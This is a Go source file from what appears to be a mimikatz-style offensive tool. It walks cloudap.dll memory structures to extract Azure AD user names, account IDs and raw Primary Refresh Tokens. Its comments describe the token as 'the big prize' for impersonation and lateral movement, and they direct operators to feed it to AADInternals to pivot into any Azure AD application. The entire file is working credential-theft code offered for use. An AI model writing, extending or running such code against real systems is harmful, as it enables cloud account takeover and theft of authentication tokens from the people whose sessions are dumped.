package sekurlsa

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
)

// CloudAPLayout captures per-build offsets inside a single
// KIWI_CLOUDAP_LOGON_SESSION node. CloudAP (cloudap.dll, Win 10+)
// is Microsoft's primary cloud-auth provider — Azure AD-joined
// accounts, Microsoft Account SSO, hybrid AD-joined sessions all
// route through it. The big prize is the Primary Refresh Token
// (PRT), which unlocks lateral movement to any Azure AD application
// the account can reach.
//
// Set NodeSize=0 (zero value) to disable. CloudAP layout values
// shift between Win 10 LCUs more aggressively than older providers,
// so v0.28.x ships framework-only — operators register layouts that
// match their target build.
type CloudAPLayout struct {
	NodeSize uint32

	// LUID — locally-unique session id. Used to merge a CloudAP
	// credential into the matching MSV1_0 LogonSession by LUID.
	LUIDOffset uint32

	// UserName UNICODE_STRING — the display name (e.g., "Alice User").
	UserNameOffset uint32

	// AccountID UNICODE_STRING — Microsoft Account / Azure AD upn
	// (e.g., "alice@contoso.onmicrosoft.com"). The operationally
	// meaningful identifier for impersonation.
	AccountIDOffset uint32

	// PRTPtrOffset is the byte offset to a uint64 pointer to the
	// Primary Refresh Token bytes. Some Win 10 LCUs store the PRT
	// inline at PRTOffset instead — set PRTPtrOffset=0 and
	// PRTOffset+PRTLenOffset to read inline.
	PRTPtrOffset uint32

	// PRTOffset is the byte offset to the inline PRT bytes (when
	// PRTPtrOffset==0). Mutually exclusive with PRTPtrOffset.
	PRTOffset uint32

	// PRTLenOffset is the byte offset to the uint32 PRT length —
	// used in both pointer and inline modes.
	PRTLenOffset uint32
}

// CloudAPCredential is the credential payload extracted from a
// single CloudAP logon session. PRT (Primary Refresh Token) is the
// raw bytes — feed to a downstream tool like AADInternals to
// derive a session token and pivot to any Azure AD application.
type CloudAPCredential struct {
	UserName  string
	AccountID string
	PRT       []byte
	Found     bool
}

// AuthPackage satisfies the Credential interface.
func (CloudAPCredential) AuthPackage() string { return "CloudAP" }

// String renders AccountID + a hex-prefix preview of the PRT — full
// PRT bytes (often hundreds of bytes) would dominate log lines.
func (c CloudAPCredential) String() string {
	prtPreview := ""
	if len(c.PRT) > 0 {
		preview := c.PRT
		if len(preview) > 16 {
			preview = preview[:16]
		}
		prtPreview = fmt.Sprintf(" prt=%s…(%db)", hex.EncodeToString(preview), len(c.PRT))
	}
	user := c.UserName
	if c.AccountID != "" {
		if user != "" {
			user += " <" + c.AccountID + ">"
		} else {
			user = c.AccountID
		}
	}
	return user + prtPreview
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
// PRT bytes are highest-value — zero them on Result.Wipe.
func (c *CloudAPCredential) wipe() {
	for i := range c.PRT {
		c.PRT[i] = 0
	}
	c.PRT = nil
	c.Found = false
}

// extractCloudAP walks cloudap.dll's KIWI_CLOUDAP_LOGON_SESSION list
// and returns one CloudAPCredential per LUID. Returns (nil, nil)
// without warning when the template lacks CloudAP support
// (CloudAPLayout.NodeSize == 0).
func extractCloudAP(r *reader, mod Module, t *Template) (map[uint64]*CloudAPCredential, []string) {
	if t.CloudAPLayout.NodeSize == 0 || len(t.CloudAPListPattern) == 0 {
		return nil, nil
	}
	listHead, err := resolveListHead(r, mod,
		t.CloudAPListPattern, t.CloudAPListWildcards, t.CloudAPListOffset)
	if err != nil {
		return nil, []string{fmt.Sprintf("CloudAP list head: %v", err)}
	}
	creds := make(map[uint64]*CloudAPCredential)
	const maxNodes = 256
	warnings := walkLinkedList(r, listHead, t.CloudAPLayout.NodeSize, maxNodes,
		func(node []byte, _ uint64) string {
			if cred, luid, ok := decodeCloudAPNode(r, node, t.CloudAPLayout); ok {
				c := cred
				creds[luid] = &c
			}
			return ""
		})
	return creds, warnings
}

// decodeCloudAPNode projects a node-bytes blob through the layout
// and reads the PRT (either via pointer-deref or inline). Returns
// ok=false on a fully-empty node.
func decodeCloudAPNode(r *reader, node []byte, layout CloudAPLayout) (CloudAPCredential, uint64, bool) {
	if uint32(len(node)) < layout.NodeSize {
		return CloudAPCredential{}, 0, false
	}

	luid := uint64(0)
	if layout.LUIDOffset+8 <= layout.NodeSize {
		luid = binary.LittleEndian.Uint64(node[layout.LUIDOffset : layout.LUIDOffset+8])
	}
	username := readUnicodeStringIfFits(r, node, layout.UserNameOffset, layout.NodeSize)
	accountID := readUnicodeStringIfFits(r, node, layout.AccountIDOffset, layout.NodeSize)

	// PRT — prefer pointer mode, fall back to inline.
	var prt []byte
	if layout.PRTLenOffset+4 <= layout.NodeSize {
		prtLen := binary.LittleEndian.Uint32(node[layout.PRTLenOffset : layout.PRTLenOffset+4])
		// Bound PRT at 64KB — real PRTs fit in ~4KB, anything larger
		// signals a malformed dump.
		if prtLen > 0 && prtLen < 65536 {
			if layout.PRTPtrOffset != 0 && layout.PRTPtrOffset+8 <= layout.NodeSize {
				ptr := binary.LittleEndian.Uint64(node[layout.PRTPtrOffset : layout.PRTPtrOffset+8])
				if ptr != 0 {
					if buf, err := r.ReadVA(ptr, int(prtLen)); err == nil {
						out := make([]byte, len(buf))
						copy(out, buf)
						prt = out
					}
				}
			} else if layout.PRTOffset != 0 && layout.PRTOffset+prtLen <= layout.NodeSize {
				out := make([]byte, prtLen)
				copy(out, node[layout.PRTOffset:layout.PRTOffset+prtLen])
				prt = out
			}
		}
	}

	c := CloudAPCredential{
		UserName:  username,
		AccountID: accountID,
		PRT:       prt,
		Found:     username != "" || accountID != "" || len(prt) > 0,
	}
	return c, luid, c.Found
}

// mergeCloudAP grafts CloudAP credentials onto matching
// LogonSessions by LUID, mirroring the other merge helpers.
func mergeCloudAP(sessions []LogonSession, cloud map[uint64]*CloudAPCredential) []LogonSession {
	return mergeByLUID(sessions, cloud, func(luid uint64, c *CloudAPCredential) LogonSession {
		return LogonSession{
			LUID:        luid,
			UserName:    c.UserName,
			Credentials: []Credential{c},
		}
	})
}
